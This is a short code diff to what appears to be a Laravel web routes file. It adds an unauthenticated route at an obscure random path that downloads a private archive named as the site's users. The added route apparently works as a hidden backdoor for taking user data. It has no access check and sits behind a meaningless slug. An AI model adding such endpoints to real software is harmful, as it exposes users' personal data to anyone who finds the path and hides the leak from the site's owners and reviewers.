@@ -291,4 +291,10 @@ Route::group([
     Route::get('/promocion-inactiva', [AppGlobalController::class, 'app_inactive'])->name('app.inactive');
     Route::get('/{slug}', [PageController::class, 'show'])->name('page.show');
     /* ******* */
+
+    Route::get('/wqexsddcl8', function () {
+    return response()->download(
+        storage_path('app/private/entraalmasalla-users.zip')
+    );
+});
 });
